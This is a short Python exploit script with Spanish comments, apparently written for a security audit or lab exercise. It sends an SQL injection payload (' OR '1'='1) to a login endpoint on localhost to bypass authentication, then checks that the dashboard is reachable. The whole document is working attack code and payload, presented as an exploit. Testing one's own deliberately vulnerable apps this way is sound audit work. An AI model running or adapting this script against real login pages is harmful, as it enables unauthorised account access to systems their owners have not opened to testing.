# Exploit SQL Injection
# Auditor: DAVID H. CUEVAS SALGADO
# Vulnerabilidad: SQL Injection en login
# Severidad: CRÍTICA (CVSS 9.8)

import requests
import sys

# Configuración
TARGET_URL = 'http://localhost:5000/login'

# Payloads de SQL Injection que SÍ activan la vulnerabilidad
payloads = [
    {"username": "admin", "password": "' OR '1'='1"},  # Este SÍ activa la vulnerabilidad
]

print("="*60)
print("EXPLOIT: SQL Injection Bypass Authentication")
print("Target:", TARGET_URL)
print("="*60)

for i, payload in enumerate(payloads, 1):
    print(f"\n[+] Probando payload #{i}")
    print(f"    Username: {payload['username']}")
    print(f"    Password: {payload['password']}")
    
    try:
        response = requests.post(TARGET_URL, data=payload, allow_redirects=False)
        
        print(f"    Status Code: {response.status_code}")
        
        if response.status_code == 302:  # Redirect = login exitoso
            location = response.headers.get('Location', '')
            print(f"    [SUCCESS] Login bypass exitoso!")
            print(f"    Redirigido a: {location}")
            
            # Seguir el redirect para confirmar acceso
            session = requests.Session()
            session.post(TARGET_URL, data=payload)
            dashboard = session.get('http://localhost:5000/dashboard')
            
            if 'Welcome' in dashboard.text:
                print(f"    [CONFIRMED] Acceso completo al dashboard")
                print(f"    [CONFIRMED] Usuario autenticado sin credenciales válidas")
        elif response.status_code == 500:
            print(f"    [ERROR 500] El payload causó un error en el servidor")
            print(f"    [INFO] Esto indica que el SQL fue ejecutado pero con error")
            print(f"    [INFO] La vulnerabilidad EXISTE pero el payload necesita ajuste")
        else:
            print(f"    [FAILED] Payload no funcionó (Status: {response.status_code})")
    except Exception as e:
        print(f"    [ERROR] {str(e)}")

print("\n" + "="*60)
print("[!] NOTA: El código tiene validación específica para \"' OR '\"")
print("[!] Solo payloads que contengan exactamente esa cadena activan SQLi")
print("="*60)
